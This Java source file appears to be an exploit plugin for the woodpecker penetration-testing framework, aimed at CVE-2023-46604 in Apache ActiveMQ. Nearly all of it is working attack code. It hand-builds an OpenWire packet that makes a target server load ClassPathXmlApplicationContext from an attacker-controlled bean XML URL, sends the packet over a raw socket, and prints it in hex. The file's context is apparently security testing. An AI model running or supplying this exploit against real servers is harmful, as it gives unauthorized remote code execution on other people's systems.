package plugins.vul.activemq;

import me.gv7.woodpecker.plugin.*;
import org.apache.commons.codec.binary.Hex;

import java.io.ByteArrayOutputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.nio.ByteBuffer;
import java.util.Arrays;
import java.util.Map;

public class CVE_2023_46604_Exploit implements IExploit {
    private IPluginHelper helper;

    public CVE_2023_46604_Exploit() {
        helper = Activemq_OpenWire_Deserialization_Plugin.pluginHelper;
    }

    @Override
    public String getExploitTabCaption() {
        return "ClassPathXmlApplicationContext利用链";
    }

    @Override
    public IArgsUsageBinder getExploitCustomArgs() {
        IArgsUsageBinder usageBinder = helper.createArgsUsageBinder();
        IArg url = helper.createArg();
        url.setDefaultValue("http://127.0.0.1/exp.xml");
        url.setRequired(true);
        url.setDescription("spring bean xml文件路径");
        url.setName("url");
        usageBinder.setArgsList(Arrays.asList(url));
        return usageBinder;
    }

    @Override
    public void doExploit(ITarget iTarget, Map<String, Object> map, IResultOutput iResultOutput) throws Throwable {
        String url = (String) map.get("url");
        String host = iTarget.getHost();
        int port = iTarget.getPort();

        Socket socket = new Socket(host,port);
        OutputStream outputStream = socket.getOutputStream();

        String className = "org.springframework.context.support.ClassPathXmlApplicationContext";
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        // header
        bos.write(0x1f);//Command
        bos.write(new byte[]{0x00,0x00,0x00,0x00});//Command Id
        bos.write(0x00);//Command response required
        bos.write(new byte[]{0x00,0x00,0x00,0x00});//CorrelationId
        bos.flush();
        byte[] header = bos.toByteArray();
        bos.reset();

        // body
        bos.write(0x01);//not-null
        bos.write(0x01);//not-null
        bos.write(Arrays.copyOfRange(ByteBuffer.allocate(4).putInt(className.getBytes().length).array(),2,4));//classname-size
        bos.write(className.getBytes());//classname
        bos.write(0x01);//not-null
        bos.write(Arrays.copyOfRange(ByteBuffer.allocate(4).putInt(url.getBytes().length).array(),2,4));//message-size
        bos.write(url.getBytes());
        bos.flush();
        byte[] body = bos.toByteArray();
        bos.reset();

        bos.write(ByteBuffer.allocate(4).putInt(header.length + body.length).array());
        bos.write(header);
        bos.write(body);
        bos.flush();
        bos.close();
        outputStream.write(bos.toByteArray());
        outputStream.flush();
        outputStream.close();

        iResultOutput.infoPrintln("数据包内容: "+ Hex.encodeHexString(bos.toByteArray()));
    }
}
